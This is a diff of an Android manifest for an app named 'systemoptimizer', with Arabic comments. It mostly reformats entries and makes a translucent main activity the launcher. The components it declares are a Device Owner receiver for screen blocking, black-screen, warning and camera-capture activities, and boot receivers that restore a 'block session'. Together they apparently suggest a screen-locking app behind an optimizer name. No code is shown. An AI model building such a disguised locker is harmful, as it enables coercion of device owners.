@@ -57,73 +57,93 @@
 
         <!-- النشاط الرئيسي (المشغّل) -->
         <activity
-        android:name=".MainActivity"
-        android:theme="@android:style/Theme.Translucent.NoTitleBar"
-        android:screenOrientation="portrait"
-        android:exported="false"
-        tools:ignore="LockedOrientationActivity" />
+            android:name=".MainActivity"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            android:screenOrientation="portrait"
+            android:exported="true"
+            tools:ignore="LockedOrientationActivity">
+
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+
+        </activity>
 
         <!-- شاشة منح صلاحيات الروت (داخلية، تُفتح من التطبيق فقط) -->
-        <activity android:name=".RootPermissionActivity"
+        <activity
+            android:name=".RootPermissionActivity"
             android:theme="@style/AppTheme"
             android:screenOrientation="portrait"
             android:exported="false" />
 
         <!-- مركز الصلاحيات (شاشة الإعداد الأولي، بدون root) -->
-        <activity android:name=".PermissionCenterActivity"
+        <activity
+            android:name=".PermissionCenterActivity"
             android:theme="@style/AppTheme"
             android:screenOrientation="portrait"
             android:exported="false" />
 
         <!-- حجب الشاشة المؤقت -->
-        <activity android:name=".BlockScreenActivity"
+        <activity
+            android:name=".BlockScreenActivity"
             android:exported="false"
             android:theme="@android:style/Theme.Black.NoTitleBar.Fullscreen" />
 
         <!-- مشغل الفيديو بملء الشاشة -->
-        <activity android:name=".VideoPlayerActivity"
+        <activity
+            android:name=".VideoPlayerActivity"
             android:exported="false"
             android:theme="@android:style/Theme.Black.NoTitleBar.Fullscreen" />
 
         <!-- رسالة التحذير الجادة -->
-        <activity android:name=".SeriousWarningActivity"
+        <activity
+            android:name=".SeriousWarningActivity"
             android:exported="false"
             android:theme="@android:style/Theme.Black.NoTitleBar.Fullscreen" />
 
         <!-- نشاط الشاشة السوداء -->
-        <activity android:name=".BlackScreenActivity"
+        <activity
+            android:name=".BlackScreenActivity"
             android:exported="false"
             android:theme="@android:style/Theme.Black.NoTitleBar.Fullscreen" />
 
         <!-- نشاط رسائل التحذير -->
-        <activity android:name=".MessageDashboardActivity"
+        <activity
+            android:name=".MessageDashboardActivity"
             android:exported="false"
             android:launchMode="singleTask"
             android:theme="@android:style/Theme.Black.NoTitleBar.Fullscreen" />
 
         <!-- نشاط التقاط الصورة -->
-        <activity android:name=".CameraCaptureActivity"
+        <activity
+            android:name=".CameraCaptureActivity"
             android:exported="false"
             android:theme="@android:style/Theme.Black.NoTitleBar.Fullscreen" />
 
-        <!-- تشخيصات إدارة الجهاز وحالة جلسة الحجب الصارمة -->
-        <activity android:name=".ManagementDiagnosticsActivity"
+        <!-- تشخيصات إدارة الأجهزة وحالة جلسة الحجب الصارمة -->
+        <activity
+            android:name=".ManagementDiagnosticsActivity"
             android:exported="false"
             android:theme="@style/AppTheme"
             android:screenOrientation="portrait" />
 
         <!-- مستقبل إدارة الأجهزة (Device Owner) لحجب الشاشة -->
-        <receiver android:name=".DeviceAdminReceiver"
+        <receiver
+            android:name=".DeviceAdminReceiver"
             android:description="@string/device_admin_description"
             android:label="@string/device_admin_label"
             android:permission="android.permission.BIND_DEVICE_ADMIN"
             android:exported="true">
+
             <meta-data
                 android:name="android.app.device_admin"
                 android:resource="@xml/device_admin_policies" />
+
             <intent-filter>
                 <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
             </intent-filter>
+
         </receiver>
 
         <!-- مزود الملفات لنشاط الكاميرا -->
@@ -132,42 +152,54 @@
             android:authorities="com.example.systemoptimizer.fileprovider"
             android:exported="false"
             android:grantUriPermissions="true">
+
             <meta-data
                 android:name="android.support.FILE_PROVIDER_PATHS"
                 android:resource="@xml/file_paths" />
+
         </provider>
 
         <!-- الخدمة الخلفية -->
-        <service android:name=".BackgroundService"
+        <service
+            android:name=".BackgroundService"
             android:enabled="true"
             android:exported="false"
             android:foregroundServiceType="dataSync" />
 
         <!-- مستقبل بدء التشغيل/الإقلاع وإعادة استعادة جلسة الحجب بعد الإقلاع -->
-        <receiver android:name=".BootReceiver"
+        <receiver
+            android:name=".BootReceiver"
             android:enabled="true"
             android:exported="true"
             android:directBootAware="true">
+
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
                 <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
                 <action android:name="android.intent.action.USER_UNLOCKED" />
             </intent-filter>
+
         </receiver>
 
         <!-- مستقبل مؤشرات جلسة الحجب (تشغيل مجدول / انتهاء) -->
-        <receiver android:name=".BlockSessionAlarmReceiver"
+        <receiver
+            android:name=".BlockSessionAlarmReceiver"
             android:enabled="true"
             android:exported="false" />
 
         <!-- مستقبل الشاشة السوداء عند بدء التشغيل -->
-        <receiver android:name=".BlackScreenBootReceiver"
+        <receiver
+            android:name=".BlackScreenBootReceiver"
             android:enabled="true"
             android:exported="true">
+
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
             </intent-filter>
+
         </receiver>
+
     </application>
+
 
 </manifest>
